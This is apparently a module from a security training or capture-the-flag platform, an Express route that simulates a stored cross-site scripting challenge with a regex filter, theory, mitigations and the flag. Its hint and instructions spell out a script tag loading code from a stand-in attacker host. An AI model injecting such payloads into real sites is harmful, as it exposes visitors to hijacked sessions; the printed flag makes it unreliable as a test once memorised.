const express = require('express');
const router = express.Router();

router.post('/execute', (req, res) => {
    const { payload, level } = req.body;
    let currentLevel = level || 'low';

    console.log(`[+] Module ${'stored-xss'} received payload: ${payload} at Level: ${currentLevel}`);

    if (!payload) return res.status(400).json({ error: "Payload required." });

    if (currentLevel === 'high') {
         return res.json({ secure: true, message: "System Secure. Vulnerability mitigated. undefined" });
    }

    if (currentLevel === 'medium') {
         // evaluate regex for medium
         let blocked = false;
         
            if (/onerror/i.test(payload)) blocked = true;
         
         
         if (blocked) {
             return res.json({ success: false, message: "Security Filter triggered. Payload dropped due to WAF rules!" });
         }
    }

    // Validation to ensure they actually exploited it right:
    let success = false;
    
         if (/(Comment:.*<script|hook)/i.test(payload)) success = true;
    

    if (success) {
         return res.json({ success: true, message: "Exploit successful! Here is your flag: flag{stored-xss_success}" });
    } else {
         return res.json({ success: false, message: "Payload executed but failed to trigger the exploit securely." });
    }

});

module.exports = {
    id: "stored-xss",
    name: "Stored Cross-Site Scripting",
    category: "Web",
    difficulty: "Varies",
    theory: "Stored XSS saves the malicious script on the target application's database (like a forum post). Any user visiting that page subsequently executes the payload without further trickery.",
    exploit: "Store an attack payload inside a persistent database record like a comment.",
    hint: "Send `Comment: <script src='http://evil.com/hook.js'></script>`.",
    whatToSolve: "Send a POST request to /api/vulns/stored-xss/execute with body: { payload: \"Comment: <script src='http://evil.com/hook.js'></script>\", level: 'low' }. This simulates storing a malicious script in a comment field that would execute for every future visitor—the server detects the hook payload and confirms the exploit.",
    expectedOutput: "{ success: true, message: 'Exploit successful! Here is your flag: flag{stored-xss_success}' }",
    mitigations: ["Sanitize user inputs and encode immediately on render.","Ensure robust DB constraints rejecting raw tags."],
    router: router
};
